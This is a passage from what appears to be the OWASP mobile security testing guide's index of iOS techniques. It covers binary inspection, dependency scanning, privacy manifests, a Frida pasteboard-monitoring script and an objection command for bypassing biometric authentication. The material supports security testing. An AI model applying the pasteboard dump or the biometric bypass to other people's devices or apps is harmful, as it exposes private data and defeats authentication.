TNAJ496RHB.OWASP.iGoat-Swift\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0112/","title":"MASTG-TECH-0112: Obtaining the Code Signature Format Version","text":"<p>To extract the code signature format version from a signed binary, you can use  codesign.</p> <p>The version is obtained by calling <code>codesign -dv</code> and identifying the value of <code>v</code> in the <code>CodeDirectory</code> row:</p> <pre><code>$ codesign -dv MASTestApp.app\nExecutable=/Users/user/MASTestApp.app\nIdentifier=org.owasp.mastestapp.MASTestApp-iOS\nFormat=Mach-O universal (armv7 arm64)\nCodeDirectory v=20400 size=404674 flags=0x0(none) hashes=12635+7 location=embedded\nSignature size=4858\n...\n</code></pre> <p>In this case the version is 20400, since the output contains <code>v=20400</code>.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0113/","title":"MASTG-TECH-0113: Obtaining Debugging Symbols","text":"<p>To retrieve debug symbols from iOS binaries you can use  radare2 for iOS,  objdump - iOS or  nm - iOS to inspect all of the app binaries.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0113/#radare2","title":"radare2","text":"<p>Using  radare2 for iOS with the command <code>is</code>:</p> <pre><code>r2 -A MASTestApp\n[0x100007408]&gt; is~Sec\n70  0x00007894 0x100007894 LOCAL  FUNC 0        imp.SecKeyCopyExternalRepresentation\n71  0x000078a0 0x1000078a0 LOCAL  FUNC 0        imp.SecKeyCopyPublicKey\n72  0x000078ac 0x1000078ac LOCAL  FUNC 0        imp.SecKeyCreateRandomKey\n73  0x000078b8 0x1000078b8 LOCAL  FUNC 0        imp.SecKeyCreateSignature\n74  0x000078c4 0x1000078c4 LOCAL  FUNC 0        imp.SecKeyVerifySignature\n</code></pre> <p>Alternatively, you can use  rabin2 to obtain the symbols by running <code>rabin2 -s MASTestApp</code>.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0113/#objdump","title":"objdump","text":"<p>The following snippet shows how you can apply  objdump - iOS on <code>MASTestApp</code> (the iOS main app executable) with the typical output of a binary containing debug symbols. Those are marked with the <code>d</code> (debug) flag. Check the objdump man page for information about various other symbol flag characters.</p> <pre><code>$ objdump --syms MASTestApp | grep \" d \" | grep \"swift\"\n...\n0000000000000000      d  *UND* MastgTest.swift\n0000000000000000      d  *UND* __swift_FORCE_LOAD_$_swiftFoundation_$_MASTestApp\n0000000000000000      d  *UND* __swift_FORCE_LOAD_$_swiftObjectiveC_$_MASTestApp\n0000000000000000      d  *UND* __swift_FORCE_LOAD_$_swiftDarwin_$_MASTestApp\n0000000000000000      d  *UND* __swift_FORCE_LOAD_$_swiftCoreFoundation_$_MASTestApp\n...\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0113/#nm","title":"nm","text":"<p>With  nm - iOS you can compare the symbols from a plain call to <code>nm</code> with the output of a call to <code>nm -a</code>. The latter also prints the debug symbols. The following command will show only debug symbols in a diff format. If this is empty, now debug symbols are present.</p> <pre><code>$ diff &lt;(nm MASTestApp) &lt;(nm -a MASTestApp)\n...\n28a228\n&gt; 0000000100009928 - 01 0000   FUN _$s10MASTestApp11ContentViewV7SwiftUI0D0AadEP05_makeD4List4view6inputsAD01_dH7OutputsVAD11_GraphValueVyxG_AD01_dH6InputsVtFZTW\n30a231\n&gt; 000000010000992c - 01 0000   FUN _$s10MASTestApp11ContentViewV7SwiftUI0D0AadEP14_viewListCount6inputsSiSgAD01_dhI6InputsV_tFZTW\n31a233,234\n&gt; 0000000100009944 - 01 0000   FUN _$s10MASTestApp11ContentViewV7SwiftUI0D0AadEP4body4BodyQzvgTW\n&gt; 0000000000000000 - 00 0000  GSYM _$s10MASTestApp11ContentViewVAC7SwiftUI0D0AAWL\n32a236\n&gt; 000000010000a220 - 01 0000   FUN _$s10MASTestApp11ContentViewVAC7SwiftUI0D0AAWl\n...\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0114/","title":"MASTG-TECH-0114: Demangling Symbols","text":"<p>To make some identifiers in the program unique, the compiler will process their symbol names. This process is called \"name mangling\" or simply \"mangling\". Often, the resulting symbols are hard to understand for humans. Additionally, their format is specific to the input language, the compiler and it may even be version dependent.</p> <p>You can use demangling tools to revert the mangling process. For Swift there is  swift-demangle, for C++ function names there is  c++filt.md.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0114/#swift-demangle","title":"swift-demangle","text":"<p>Pass the mangled symbol to  swift-demangle:</p> <pre><code>$ xcrun swift-demangle __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO\n_T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO ---&gt; @nonobjc __C.WKWebView.init(frame: __C_Synthesized.CGRect, configuration: __C.WKWebViewConfiguration) -&gt; __C.WKWebView\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0114/#cfilt","title":"c++filt","text":"<p>You can demangle C++ symbols with  c++filt:</p> <pre><code>c++filt _ZSt6vectorIiSaIiEE\nstd::vector&lt;int, std::allocator&lt;int&gt;&gt;\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0118/","title":"MASTG-TECH-0118: Obtaining Compiler-Provided Security Features","text":"<p>The iOS compiler provides several security features that can be enabled during compilation. These features help protect the application from common vulnerabilities like buffer overflows and memory leaks. This technique provides guidance on how to check if these features are enabled in the compiled binary.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0118/#radare2-for-ios","title":"radare2 for iOS","text":"<p>In radare2, the presence of these compiler-provided security features can be checked by using the <code>i</code> and <code>is</code> commands.</p> <p>Check for PIC and Canaries: Using the <code>i</code> command, you can check if the binary has Position Independent Code (PIC) enabled (<code>pic</code>) and if it has stack canaries (<code>canary</code>).</p> <pre><code>r2 MASTestApp\n[0x100007408]&gt; i~canary,pic\ncanary   true\npic      true\n</code></pre> <p>The output shows that the binary has stack canaries and PIE enabled.</p> <p>Check for ARC: Using the <code>is</code> command, you can list the symbols in the binary and check for symbols that indicate the usage of Automatic Reference Counting (ARC). Common ARC symbols include:</p> <ul> <li><code>objc_autorelease</code></li> <li><code>objc_retainAutorelease</code></li> <li><code>objc_release</code></li> <li><code>objc_retain</code></li> <li><code>objc_retainAutoreleasedReturnValue</code></li> <li><code>swift_release</code></li> <li><code>swift_retain</code></li> </ul> <p>An iOS binary does not need to have all of these symbols to be considered ARC-enabled, but the presence of some of them indicates that ARC is used.</p> <pre><code>[0x100007408]&gt; is~release,retain\n80  0x0000790c 0x10000790c LOCAL  FUNC 0        imp.objc_release_x20\n81  0x00007918 0x100007918 LOCAL  FUNC 0        imp.objc_release_x24\n82  0x00007924 0x100007924 LOCAL  FUNC 0        imp.objc_release_x25\n83  0x00007930 0x100007930 LOCAL  FUNC 0        imp.objc_release_x27\n84  0x0000793c 0x10000793c LOCAL  FUNC 0        imp.objc_release_x8\n85  0x00007948 0x100007948 LOCAL  FUNC 0        imp.objc_retainAutoreleasedReturnValue\n86  0x00007954 0x100007954 LOCAL  FUNC 0        imp.objc_retain_x23\n101 0x00007a08 0x100007a08 LOCAL  FUNC 0        imp.swift_release\n102 0x00007a14 0x100007a14 LOCAL  FUNC 0        imp.swift_retain\n</code></pre> <p>The output shows that the binary contains symbols indicating the usage of ARC.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0118/#objection-for-ios","title":"objection for iOS","text":"<p>Objection has a command <code>ios info binary</code> which can be used to get information about the binary, including whether stack canaries and PIE are enabled.</p> <pre><code>com.yourcompany.PPClient on (iPhone: 13.2.3) [usb] # ios info binary\nName                  Type     Encrypted    PIE    ARC    Canary    Stack Exec    RootSafe\n--------------------  -------  -----------  -----  -----  --------  ------------  ----------\nPayPal                execute  True         True   True   True      False         False\nCardinalMobile        dylib    False        False  True   True      False         False\nFraudForce            dylib    False        False  True   True      False         False\n...\n</code></pre> <p>The output shows <code>PIE</code>, <code>ARC</code> and <code>Canary</code> with a value of <code>True</code> or <code>False</code>.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0132/","title":"MASTG-TECH-0132: Software Composition Analysis (SCA) of iOS Dependencies by Creating a SBOM","text":"<p>You can use  cdxgen to create a Software Bill of Materials (SBOM) in the CycloneDX format if you use SwiftPM. Currently, Carthage and CocoaPods are not supported. You can either ask the development team to provide the SBOM file or create it yourself. To do so, navigate to the root directory of the Xcode project you wish to scan, then execute the following command:</p> <pre><code>$ cdxgen -o sbom.json\n</code></pre> <p>The SBOM file that was created needs to be Base64 encoded and uploaded to  dependency-track for analysis.</p> <pre><code>$ cat sbom.json | base64\n$ curl -X \"PUT\" \"http://localhost:8081/api/v1/bom\" \\\n     -H 'Content-Type: application/json' \\\n     -H 'X-API-Key: &lt;YOUR API KEY&gt;&gt;' \\\n     -d $'{\n  \"project\": \"&lt;YOUR PROJECT ID&gt;\",\n  \"bom\": \"&lt;BASE64-ENCODED SBOM&gt;\"\n  }'\n</code></pre> <p>Also check the alternatives for uploading the SBOM file in case the produced JSON file is too large.</p> <p>If you are using the default settings of the  Visual Studio Code (vscode) Docker container, go to the frontend of  dependency-track, which is http://localhost:8080. Open the project to which you uploaded the SBOM to verify if there are any vulnerable dependencies.</p> <p>Note: Transitive dependencies are not supported by  cdxgen for SwiftPM.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0133/","title":"MASTG-TECH-0133: Software Composition Analysis (SCA) of iOS Dependencies by Scanning Package Manager Artifacts","text":"<p>iOS has several dependency managers, where the most popular are:</p> <ul> <li>Carthage,</li> <li>CocoaPods and</li> <li>SwiftPM (Swift Package Manager)</li> </ul> <p>The dependencies are integrated into the project during the build process and are then compiled into the IPA file. However, the version information of the dependencies may be stripped out during compilation, which means we cannot scan the IPA file. Fortunately, we can scan the artifacts produced by the dependency managers.</p> <p>Tools such as  dependency-check can scan files created by all three dependency managers. These files list dependencies as Common Platform Enumeration (CPE) and their versions. The CPE will be included in the iOS app. These tools then search for known vulnerabilities, or CVEs (Common Vulnerability and Exposure), in the dependencies by checking them against a vulnerability database, such as the National Vulnerability Database (NVD).</p> <p>Note that  dependency-check supports Carthage, CocoaPods and SwiftPM, but these analyzers are considered experimental. While these analyzers may be useful and provide valid results, more testing must be completed to ensure that the false negative/positive rates are acceptable.</p> <p>To test with  dependency-check, we need to retrieve the dependency manager's corresponding file:</p> <ul> <li>For Carthage it is the file <code>Cartfile.resolved</code>.</li> <li>For CocoaPods it is the file <code>*.podspec</code> or <code>Podfile.lock</code></li> <li>For SwiftPM it is the file <code>Package.swift</code> or <code>Package.resolved</code></li> </ul> <p>Keep in mind that developers may use more than one dependency manager, so you may need to perform more than one scan. When scanning with  dependency-check, scanning the file created by the dependency manager is sufficient; you don't need access to the entire Xcode project or source code.</p> <p>Before running the scan, obtain an API key for NVD. This key is used to retrieve the latest CVE information. You can request the API key to access the NVD API from https://nvd.nist.gov/developers/request-an-api-key.</p> <ul> <li>To start a scan for a project using SwiftPM, execute the following command to scan the <code>Package.Swift</code> or <code>Package.resolved</code>:</li> </ul> <pre><code>$ dependency-check --enableExperimental -f SARIF --nvdApiKey &lt;YOUR-API-KEY&gt; -s Package.resolved\n</code></pre> <ul> <li>To start a scan for a project using CocoaPods, execute the following command to scan the <code>Podfile.lock</code> or <code>*.podspec</code>:</li> </ul> <pre><code>$ dependency-check --enableExperimental -f SARIF --nvdApiKey &lt;YOUR-API-KEY&gt; -s Podfile.lock\n</code></pre> <ul> <li>To start a scan for a project using Carthage, execute the following command to scan the <code>Cartfile.resolved.</code>:</li> </ul> <pre><code>$ dependency-check --enableExperimental -f SARIF --nvdApiKey &lt;YOUR-API-KEY&gt; -s Cartfile.resolved\n</code></pre> <p>The output is always a SARIF file which can be viewed using the Sarif viewer plugin in  Visual Studio Code (vscode). Any known vulnerabilities found will be listed with their CVE number and description.</p> <p>You can only scan one file at a time. When scanning for CocoaPods or Carthage, use the same command but scan the corresponding dependency manager file.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0134/","title":"MASTG-TECH-0134: Monitoring the Pasteboard","text":"<p>You can monitor the pasteboard to check for sensitive data being copied to it. This is useful for detecting potential data leaks or misuse of the pasteboard in iOS applications.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0134/#getting-pasteboard-information","title":"Getting Pasteboard Information","text":"<ul> <li>Obtain the pasteboard name by hooking <code>pasteboardWithName:create:</code> and inspecting its input parameters, or <code>pasteboardWithUniqueName</code> and inspecting its return value.</li> <li>Get the first available pasteboard item: e.g., for strings, use the <code>string</code> method. Alternatively, use any of the other methods for the standard data types.</li> <li>Get the number of items with <code>numberOfItems</code>.</li> <li>Check for the existence of standard data types with the convenience methods, e.g., <code>hasImages</code>, <code>hasStrings</code>, <code>hasURLs</code> (starting in iOS 10).</li> <li>Check for other data types (typically UTIs) with <code>containsPasteboardTypes: inItemSet:</code>. You may inspect more concrete data types like, for example, a picture as public.png and public.tiff (UTIs) or for custom data such as com.mycompany.myapp.mytype. Remember that, in this case, only those apps that declare knowledge of the type are able to understand the data written to the pasteboard. This is the same as we have seen in the UIActivity Sharing section. Retrieve them using <code>itemSetWithPasteboardTypes:</code> and setting the corresponding UTIs.</li> <li>Check for excluded or expiring items by hooking <code>setItems:options:</code> and inspecting its options for <code>UIPasteboardOptionLocalOnly</code> or <code>UIPasteboardOptionExpirationDate</code>.</li> </ul>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0134/#monitoring-sensitive-data","title":"Monitoring Sensitive Data","text":"<p>If only looking for strings, you may want to use the command <code>ios pasteboard monitor</code> from  objection for iOS:</p> <p>Hooks into the iOS UIPasteboard class and polls the generalPasteboard every 5 seconds for data. If new data is found, different from the previous poll, that data will be dumped to the screen.</p> <p>You may also build your own pasteboard monitor that monitors specific information as seen above.</p> <p>For example, this script (inspired by the script behind objection's pasteboard monitor) reads the pasteboard items every 5 seconds. If there's something new, it will print it:</p> <pre><code>const UIPasteboard = ObjC.classes.UIPasteboard;\n    const Pasteboard = UIPasteboard.generalPasteboard();\n    var items = \"\";\n    var count = Pasteboard.changeCount().toString();\n\nsetInterval(function () {\n      const currentCount = Pasteboard.changeCount().toString();\n      const currentItems = Pasteboard.items().toString();\n\n      if (currentCount === count) { return; }\n\n      items = currentItems;\n      count = currentCount;\n\n      console.log('[* Pasteboard changed] count: ' + count +\n      ' hasStrings: ' + Pasteboard.hasStrings().toString() +\n      ' hasURLs: ' + Pasteboard.hasURLs().toString() +\n      ' hasImages: ' + Pasteboard.hasImages().toString());\n      console.log(items);\n\n    }, 1000 * 5);\n</code></pre> <p>In the output, we can see the following:</p> <pre><code>[* Pasteboard changed] count: 64 hasStrings: true hasURLs: false hasImages: false\n(\n    {\n        \"public.utf8-plain-text\" = hola;\n    }\n)\n[* Pasteboard changed] count: 65 hasStrings: true hasURLs: true hasImages: false\n(\n    {\n        \"public.url\" = \"https://codeshare.frida.re/\";\n        \"public.utf8-plain-text\" = \"https://codeshare.frida.re/\";\n    }\n)\n[* Pasteboard changed] count: 66 hasStrings: false hasURLs: false hasImages: true\n(\n    {\n        \"com.apple.uikit.image\" = \"&lt;UIImage: 0x1c42b23c0&gt; size {571, 264} orientation 0 scale 1.000000\";\n        \"public.jpeg\" = \"&lt;UIImage: 0x1c44a1260&gt; size {571, 264} orientation 0 scale 1.000000\";\n        \"public.png\" = \"&lt;UIImage: 0x1c04aaaa0&gt; size {571, 264} orientation 0 scale 1.000000\";\n    }\n)\n</code></pre> <p>You see that first a text was copied, including the string <code>\"hola\"</code>. After that, a URL was copied, and finally, a picture was copied. Some of them are available via different UTIs. Other apps will consider these UTIs to allow pasting of this data or not.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0135/","title":"MASTG-TECH-0135: Bypassing Biometric Authentication","text":"<p>This technique can typically be used to bypass biometric authentication in apps that perform it by only returning a success or failure result (e.g., <code>if authenticated {...}</code> check) instead of using the <code>SecAccessControlCreateWithFlags</code> Keychain API and requiring user presence.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0135/#method-for-jailbroken-and-non-jailbroken-devices","title":"Method for Jailbroken and Non-jailbroken Devices","text":"<p>If you have a jailbroken device with frida-server installed, you can bypass biometric authentication by running  objection with the <code>ios ui biometrics_bypass</code> command:</p> <pre><code>objection -g MASTestApp explore\nios ui biometrics_bypass\n</code></pre> <p>See the sample output below for using this technique against the  Runtime Use of LAContext.evaluatePolicy with Frida demo app.</p> <p> </p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0135/#method-for-non-jailbroken-devices","title":"Method for Non-jailbroken Devices","text":"<p> objection cannot attach to apps on non-jailbroken devices unless the app has been repackaged with the <code>get-task-allow</code> flag.  Debugging describes how to re-sign an app with this flag. After re-signing, you can use the same method as with jailbroken devices.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0136/","title":"MASTG-TECH-0136: Retrieving PrivacyInfo.xcprivacy Files","text":"<p>iOS apps can include privacy manifest files that provides information about the app's privacy practices as well as its components (e.g. Frameworks, Plugins, etc.). These files are typically named <code>PrivacyInfo.xcprivacy</code> and are used to declare the app's data collection practices, including any third-party libraries or frameworks that may collect user data.</p> <p>To retrieve these files, you can use the following command in your terminal:</p> <pre><code>find . -name \"PrivacyInfo.xcprivacy\"\n</code></pre> <p>For example, assuming you have an iOS social media app named <code>SocialApp.ipa</code>, and you've extracted it using  Obtaining and Extracting Apps, you can run the following commands from the <code>Payload/</code> folder to find all <code>PrivacyInfo.xcprivacy</code> files within the app bundle (truncated and reordered for readability):</p> <pre><code>find . -name \"PrivacyInfo.xcprivacy\"\n\n./SocialApp.app/PrivacyInfo.xcprivacy\n./SocialApp.app/FirebaseCore_Privacy.bundle/PrivacyInfo.xcprivacy\n./SocialApp.app/LetterPrivacyInfo.bundle/PrivacyInfo.xcprivacy\n./SocialApp.app/CoreMain.bundle/PrivacyInfo.xcprivacy\n...\n./SocialApp.app/PlugIns/WidgetExtension.appex/PrivacyInfo.xcprivacy\n./SocialApp.app/PlugIns/WidgetExtension.appex/Deep_Privacy.bundle/PrivacyInfo.xcprivacy\n...\n./SocialApp.app/Extensions/SocialAppAssetExtension.appex/PrivacyInfo.xcprivacy\n...\n./SocialApp.app/Frameworks/OXSDK_1.framework/PrivacyInfo.xcprivacy\n./SocialApp.app/Frameworks/SpotifyLogin.framework/PrivacyInfo.xcprivacy\n...\n</code></pre> <p>This output shows how SocialApp has multiple <code>PrivacyInfo.xcprivacy</code> files, including one for the main app (<code>./SocialApp.app/PrivacyInfo.xcprivacy</code>) and several others for its .bundles, PlugIns, Extensions and Frameworks (and any other nested .bundles).</p> <p>Let's take a look at the main privacy manifest, <code>./SocialApp.app/PrivacyInfo.xcprivacy</code> (truncated for readability):</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"&gt;\n&lt;plist version=\"1.0\"&gt;\n&lt;dict&gt;\n        &lt;key&gt;NSPrivacyAccessedAPITypes&lt;/key&gt;\n        &lt;array&gt;\n                &lt;dict&gt;\n                        &lt;key&gt;NSPrivacyAccessedAPIType&lt;/key&gt;\n                        &lt;string&gt;NSPrivacyAccessedAPICategoryUserDefaults&lt;/string&gt;\n                        &lt;key&gt;NSPrivacyAccessedAPITypeReasons&lt;/key&gt;\n                        &lt;array&gt;\n                                &lt;string&gt;CA92.1&lt;/string&gt;\n                                &lt;string&gt;1C8F.1&lt;/string&gt;\n                                ...\n        &lt;/array&gt;\n        &lt;key&gt;NSPrivacyCollectedDataTypes&lt;/key&gt;\n        &lt;array&gt;\n                &lt;dict&gt;\n                        &lt;key&gt;NSPrivacyCollectedDataType&lt;/key&gt;\n                        &lt;string&gt;NSPrivacyCollectedDataTypeName&lt;/string&gt;\n                        &lt;key&gt;NSPrivacyCollectedDataTypeLinked&lt;/key&gt;\n                        &lt;true/&gt;\n                        &lt;key&gt;NSPrivacyCollectedDataTypePurposes&lt;/key&gt;\n                        &lt;array&gt;\n                                &lt;string&gt;NSPrivacyCollectedDataTypePurposeAppFunctionality&lt;/string&gt;\n                                &lt;string&gt;NSPrivacyCollectedDataTypePurposeOther&lt;/string&gt;\n                        &lt;/array&gt;\n                        &lt;key&gt;NSPrivacyCollectedDataTypeTracking&lt;/key&gt;\n                        &lt;false/&gt;\n                &lt;/dict&gt;\n                ...\n        &lt;/array&gt;\n        &lt;key&gt;NSPrivacyTracking&lt;/key&gt;\n        &lt;true/&gt;\n        &lt;key&gt;NSPrivacyTrackingDomains&lt;/key&gt;\n        &lt;array&gt;\n                &lt;string&gt;trk-v2.socialapp.com&lt;/string&gt;\n                &lt;string&gt;trk-v2.socialapp.us&lt;/string&gt;\n                ...\n        &lt;/array&gt;\n&lt;/dict&gt;\n&lt;/plist&gt;\n</code></pre> <p>See  Convert Plist Files to JSON for converting this file to JSON and  Analyzing PrivacyInfo.xcprivacy Files for more information on analyzing the contents of <code>PrivacyInfo.xcprivacy</code> files.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0137/","title":"MASTG-TECH-0137: Analyzing PrivacyInfo.xcprivacy Files","text":"<p>Once you've obtained a privacy manifest as indicated in  Retrieving PrivacyInfo.xcprivacy Files, you can proceed to analyze it.</p> <p>Let's use the <code>SocialApp.app/PrivacyInfo.xcprivacy</code> file as an example.</p> SocialApp.app/PrivacyInfo.xcprivacy <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"&gt;\n&lt;plist version=\"1.0\"&gt;\n&lt;dict&gt;\n        &lt;key&gt;NSPrivacyAccessedAPITypes&lt;/key&gt;\n        &lt;array&gt;\n                &lt;dict&gt;\n                        &lt;key&gt;NSPrivacyAccessedAPIType&lt;/key&gt;\n                        &lt;string&gt;NSPrivacyAccessedAPICategoryUserDefaults&lt;/string&gt;\n                        &lt;key&gt;NSPrivacyAccessedAPITypeReasons&lt;/key&gt;\n                        &lt;array&gt;\n                                &lt;string&gt;CA92.1&lt;/string&gt;\n                                &lt;string&gt;1C8F.1&lt;/string&gt;\n                                &lt;string&gt;C56D.1&lt;/string&gt;\n                        &lt;/array&gt;\n                &lt;/dict&gt;\n                &lt;dict&gt;\n                        &lt;key&gt;NSPrivacyAccessedAPIType&lt;/key&gt;\n                        &lt;string&gt;NSPrivacyAccessedAPICategoryActiveKeyboards&lt;/string&gt;\n                        &lt;key&gt;NSPrivacyAccessedAPITypeReasons&lt;/key&gt;\n                        &lt;array&gt;\n                                &lt;string&gt;54BD.1&lt;/string&gt;\n                        &lt;/array&gt;\n                &lt;/dict&gt;\n        &lt;/array&gt;\n        &lt;key&gt;NSPrivacyCollectedDataTypes&lt;/key&gt;\n        &lt;array&gt;\n                &lt;dict&gt;\n                        &lt;key&gt;NSPrivacyCollectedDataType&lt;/key&gt;\n                        &lt;string&gt;NSPrivacyCollectedDataTypeName&lt;/string&gt;\n                        &lt;key&gt;NSPrivacyCollectedDataTypeLinked&lt;/key&gt;\n                        &lt;true/&gt;\n                        &lt;key&gt;NSPrivacyCollectedDataTypePurposes&lt;/key&gt;\n                        &lt;array&gt;\n                                &lt;string&gt;NSPrivacyCollectedDataTypePurposeAppFunctionality&lt;/string&gt;\n                                &lt;string&gt;NSPrivacyCollectedDataTypePurposeOther&lt;/string&gt;\n                        &lt;/array&gt;\n                        &lt;key&gt;NSPrivacyCollectedDataTypeTracking&lt;/key&gt;\n                        &lt;false/&gt;\n                &lt;/dict&gt;\n                &lt;dict&gt;\n                        &lt;key&gt;NSPrivacyCollectedDataType&lt;/key&gt;\n                        &lt;string&gt;NSPrivacyCollectedDataTypeOtherDiagnosticData&lt;/string&gt;\n                        &lt;key&gt;NSPrivacyCollectedDataTypeLinked&lt;/key&gt;\n                        &lt;true/&gt;\n                        &lt;key&gt;NSPrivacyCollectedDataTypePurposes&lt;/key&gt;\n                        &lt;array&gt;\n                                &lt;string&gt;NSPrivacyCollectedDataTypePurposeAnalytics&lt;/string&gt;\n                                &lt;string&gt;NSPrivacyCollectedDataTypePurposeAppFunctionality&lt;/string&gt;\n                                &lt;string&gt;NSPrivacyCollectedDataTypePurposeOther&lt;/string&gt;\n                        &lt;/array&gt;\n                        &lt;key&gt;NSPrivacyCollectedDataTypeTracking&lt;/key&gt;\n                        &lt;false/&gt;\n                &lt;/dict&gt;\n        &lt;/array&gt;\n        &lt;key&gt;NSPrivacyTracking&lt;/key&gt;\n        &lt;true/&gt;\n        &lt;key&gt;NSPrivacyTrackingDomains&lt;/key&gt;\n        &lt;array&gt;\n                &lt;string&gt;trk-v2.socialapp.com&lt;/string&gt;\n                &lt;string&gt;trk-v2.socialapp.us&lt;/string&gt;\n                &lt;string&gt;trk-v2.socialapp.eu&lt;/string&gt;\n        &lt;/array&gt;\n&lt;/dict&gt;\n&lt;/plist&gt;\n</code></pre> <p>This <code>PrivacyInfo.xcprivacy</code> file contains:</p> <ul> <li>NSPrivacyAccessedAPITypes: Lists the APIs types accessed by the app along with their reasons for access. In this case:<ul> <li><code>NSPrivacyAccessedAPICategoryUserDefaults</code>: <code>UserDefaults</code> accessed for reasons <code>CA92.1</code>, <code>1C8F.1</code>, <code>C56D.1</code>.</li> <li><code>NSPrivacyAccessedAPICategoryActiveKeyboards</code>: interaction with active keyboards accessed for reason <code>54BD.1</code>.</li> </ul> </li> <li>NSPrivacyCollectedDataTypes: Lists the types of data collected by the app and the specific purposes. It also indicates whether the collected data is linked to the user's identity (<code>NSPrivacyCollectedDataTypeLinked</code>) and whether it is used for tracking purposes (<code>NSPrivacyCollectedDataTypeTracking</code>). In this case:<ul> <li><code>NSPrivacyCollectedDataTypeName</code>: collects the user name with purposes including \"App Functionality\" and \"Other\" (linked to the user identity but not used for tracking).</li> <li><code>NSPrivacyCollectedDataTypeOtherDiagnosticData</code>: collects other diagnostic data for purposes including \"Analytics\", \"App Functionality\", and \"Other\" (linked to the user identity but not used for tracking).</li> </ul> </li> <li>NSPrivacyTracking: Indicates that SocialApp uses data for tracking as defined under the App Tracking Transparency framework.</li> <li>NSPrivacyTrackingDomains: Lists the domains used for tracking purposes, which in this case includes various SocialApp-related domains.</li> </ul> <p>You can use several tools and parsers to read and analyze these files programmatically.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0137/#using-jq","title":"Using jq","text":"<p>If you convert the <code>PrivacyInfo.xcprivacy</code> file to JSON format as described in  Convert Plist Files to JSON, you can use jq to make queries.</p> <p>For example, to extract all <code>NSPrivacyAccessedAPITypeReasons</code> for each <code>NSPrivacyAccessedAPIType</code>:</p> <pre><code>cat SocialApp.app/PrivacyInfo.json | jq '.NSPrivacyAccessedAPITypes[] | {api: .NSPrivacyAccessedAPIType, reasons: .NSPrivacyAccessedAPITypeReasons}'\n</code></pre> <p>Which outputs (truncated for readability):</p> <pre><code>{\n  \"api\": \"NSPrivacyAccessedAPICategoryUserDefaults\",\n  \"reasons\": [\n    \"CA92.1\",\n    \"1C8F.1\",\n    \"C56D.1\"\n  ]\n}\n{\n  \"api\": \"NSPrivacyAccessedAPICategorySystemBootTime\",\n  \"reasons\": [\n    \"35F9.1\"\n  ]\n}\n...\n</code></pre> <p>Benefits include readable output, standard JSON tooling, and concise selection syntax. Caveats are that dates and raw data blobs become strings, numeric precision may shift, and comments and key ordering are lost. Consider Python's  plistlib module if you need to preserve plist-specific types.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0137/#using-plistlib","title":"Using plistlib","text":"<p>Use Python's built-in <code>plistlib</code> module to read and manipulate plist files, including <code>PrivacyInfo.xcprivacy</code>.</p> <p>For example, to extract the <code>NSPrivacyAccessedAPITypeReasons</code> for each <code>NSPrivacyAccessedAPIType</code>:</p> <pre><code>import plistlib\nimport json\n\n# load the .xcprivacy plist\nwith open('SocialApp.app/PrivacyInfo.xcprivacy', 'rb') as fp:\n    data = plistlib.load(fp)\n\n# extract and print each API and its reasons in JSON\nfor item in data.get('NSPrivacyAccessedAPITypes', []):\n    api = item.get('NSPrivacyAccessedAPIType')\n    reasons = item.get('NSPrivacyAccessedAPITypeReasons')\n    print(json.dumps({'api': api, 'reasons': reasons}, ensure_ascii=False))\n</code></pre> <p>The output is (truncated for readability):</p> <pre><code>{\"api\": \"NSPrivacyAccessedAPICategoryUserDefaults\", \"reasons\": [\"CA92.1\", \"1C8F.1\", \"C56D.1\"]}\n{\"api\": \"NSPrivacyAccessedAPICategorySystemBootTime\", \"reasons\": [\"35F9.1\"]}\n...\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0137/#using-plistbuddy","title":"Using PlistBuddy","text":"<p>Use  PlistBuddy to read and manipulate plist files directly without converting them to JSON, including <code>PrivacyInfo.xcprivacy</code>.</p> <p>For example, you can read <code>NSPrivacyAccessedAPITypes</code> using the following command:</p> <pre><code>/usr/libexec/PlistBuddy -c \"Print NSPrivacyAccessedAPITypes\" ./SocialApp.app/PrivacyInfo.xcprivacy\nArray {\n    Dict {\n        NSPrivacyAccessedAPIType = NSPrivacyAccessedAPICategoryUserDefaults\n        